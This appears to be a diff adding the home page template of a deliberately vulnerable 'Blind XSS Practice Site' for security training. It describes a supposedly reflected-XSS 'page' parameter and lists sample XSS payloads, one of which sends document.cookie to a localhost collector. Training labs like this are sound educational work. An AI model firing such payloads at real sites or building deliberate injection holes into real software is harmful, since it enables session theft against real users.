@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blind XSS Practice Site</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #d9534f; }
+        nav { margin-bottom: 20px; }
+        nav a { margin-right: 15px; text-decoration: none; color: #337ab7; }
+        nav a:hover { text-decoration: underline; }
+        .vulnerable-section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
+        .warning { background-color: #f9f2f4; color: #a94442; padding: 10px; border-radius: 4px; margin: 10px 0; }
+        form { margin: 15px 0; }
+        input, textarea { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background-color: #5cb85c; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #4cae4c; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Blind XSS Practice Site</h1>
+        
+        <nav>
+            <a href="/">Home</a>
+            <a href="/comments">Comments</a>
+            <a href="/contact">Contact</a>
+            <a href="/search?q=test">Search</a>
+            <a href="/profile/test">Profile</a>
+            <a href="/admin">Admin Panel</a>
+        </nav>
+        
+        <div class="warning">
+            <strong>WARNING:</strong> This site contains intentional vulnerabilities for educational purposes.
+            Do not use any real personal information.
+        </div>
+        
+        <h2>Welcome to the Blind XSS Practice Site</h2>
+        <p>This site has been created for educational purposes to practice identifying and exploiting Blind XSS vulnerabilities.</p>
+        
+        <div class="vulnerable-section">
+            <h3>Vulnerable Page Parameter</h3>
+            <p>You are viewing page: <strong><%= typeof page !== 'undefined' ? page : 'home' %></strong></p>
+            <p>This is vulnerable to reflected XSS via the 'page' query parameter.</p>
+        </div>
+        
+        <div class="vulnerable-section">
+            <h3>Try These XSS Payloads:</h3>
+            <ul>
+                <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+                <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
+                <li><code>&lt;script&gt;new Image().src='http://localhost:3000/collect-xss?'+document.cookie;&lt;/script&gt;</code> (Blind XSS)</li>
+            </ul>
+        </div>
+        
+        <div class="vulnerable-section">
+            <h3>Common Attack Vectors</h3>
+            <ul>
+                <li>Comment forms</li>
+                <li>Search boxes</li>
+                <li>User-Agent headers</li>
+                <li>Profile names</li>
+                <li>URL parameters</li>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
